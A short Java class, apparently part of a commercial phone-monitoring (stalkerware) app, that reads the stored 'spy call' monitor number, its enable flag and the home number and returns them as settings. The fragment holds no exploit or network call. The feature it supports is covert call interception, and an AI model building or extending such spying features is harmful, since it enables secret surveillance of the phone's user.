package com.fx.maind.command.processor;

import com.fx.maind.ref.SpyCallSettings;
import com.vvt.daemon.appengine.AppEngine;
import com.vvt.preference_manager.PrefHomeNumber;
import com.vvt.preference_manager.PrefMonitorNumber;
import com.vvt.preference_manager.PreferenceManager;
import com.vvt.preference_manager.PreferenceType;

public class RemoteGetSpyCallSettingsProcessor {

private AppEngine mAppEngine;
	
	public RemoteGetSpyCallSettingsProcessor(AppEngine appEngine) {
		mAppEngine = appEngine;
	}
	
	public SpyCallSettings process() {
		SpyCallSettings spyCallSettings = new SpyCallSettings();
		PreferenceManager preferenceManager = mAppEngine.getPreferenceManager();
		
		PrefMonitorNumber monitorNumber = (PrefMonitorNumber)preferenceManager.getPreference(PreferenceType.MONITOR_NUMBER);
		spyCallSettings.setEnableMonitor(monitorNumber.getEnableMonitor());
		spyCallSettings.AddMonitorNumber(monitorNumber.getMonitorNumber());
		
		PrefHomeNumber homeNumber = (PrefHomeNumber)preferenceManager.getPreference(PreferenceType.HOME_NUMBER);
		spyCallSettings.AddHomeNumber(homeNumber.getHomeNumber());
				
		return spyCallSettings;
	}
}
